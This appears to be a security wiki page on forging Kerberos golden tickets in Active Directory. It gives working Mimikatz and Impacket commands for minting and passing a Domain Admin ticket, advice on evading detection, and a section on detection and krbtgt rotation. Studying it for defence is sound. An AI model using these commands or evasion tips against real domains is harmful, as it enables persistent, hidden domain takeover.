---
title: Golden tickets
slug: golden-tickets
---

> **TL;DR:** Forge TGTs with the `krbtgt` long-term key — full domain persistence that survives DA password resets and lasts until krbtgt is rotated twice.

## What it is
The `krbtgt` account's secret key encrypts and signs every TGT issued in the domain. With that key, an attacker mints a TGT offline: arbitrary username, arbitrary group SIDs in the PAC, arbitrary lifetime (default 10 years in forgers). The DC validates the TGT against its own krbtgt key and accepts it. Result: pass-the-ticket as any user — including non-existent ones — for the configured lifetime, without ever touching a DC during forgery.

## Preconditions / where it applies
- The krbtgt NT hash, AES128 or AES256 key. Obtained via [[dcsync]], NTDS.dit dump, or DA on a DC.
- Domain SID (`whoami /user` on any domain account works).
- Optional but recommended: a real user's RID to embed (helps blend in PAC validation logs).
- KDC reachable for the subsequent S4U / TGS-REQ.

## Technique
Pick an encryption key. AES256 forgeries dodge "RC4 is suspicious" detection on AES-only domains; RC4 forgeries still work everywhere.

```powershell
# Mimikatz — AES256 ticket as fake user with DA group
kerberos::golden /user:elite /domain:corp.lab /sid:S-1-5-21-... `
  /aes256:<krbtgt-aes256> /id:500 /groups:512,513,518,519,520 `
  /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

```bash
# Impacket — generate then pass-the-ticket
ticketer.py -nthash <krbtgt-nt> -domain-sid S-1-5-21-... -domain corp.lab Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.lab/Administrator@dc.corp.lab
```

Important fields:

- `/id` (RID): pick 500 (Administrator) for simplicity; or an unused RID to dodge "logon as non-existent SID" detections.
- `/groups`: 512 (DA), 513 (Domain Users), 518 (Schema Admins), 519 (Enterprise Admins), 520 (Group Policy Creator Owners).
- `/startoffset`/`/endin`/`/renewmax`: keep within "normal" 10-hour values to avoid the canonical "10-year ticket" red flag.

For forest-wide reach, see [[child-to-forest-root]]: forge a child-domain golden ticket with an extra SID in `ExtraSids` pointing at Enterprise Admins.

## Detection and defence
- **Rotate krbtgt twice**, 10+ hours apart, on any DA-compromise assumption. One rotation only invalidates *new* TGTs; the second invalidates the in-flight ones from the first.
- Alert on 4769 TGS-REQ where `TicketEncryptionType=0x17` (RC4) on AES-only domains, or where the account name doesn't exist in AD ("PAC for ghost user").
- Compare TGT lifetime in 4768/4769 against policy — golden tickets default to 10-year lifetimes unless the forger tweaks them.
- Enable "Audit Kerberos Service Ticket Operations" + Defender for Identity's "Suspected Golden Ticket" detector.
- Treat krbtgt as the crown jewel — restrict who can DCSync, monitor 4662 with the replication GUIDs.
- See [[silver-tickets]] for the per-service equivalent and [[ad-persistence]] for stacking primitives.

## References
- [the.hacker.recipes — Golden ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden) — primitive reference
- [HackTricks — Golden ticket](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberos-tickets.html) — tool examples
- [Microsoft — Kerberos PAC validation](https://learn.microsoft.com/openspecs/windows_protocols/ms-pac/) — PAC structure
- [SpecterOps — Golden ticket detection](https://posts.specterops.io/) — telemetry hunting
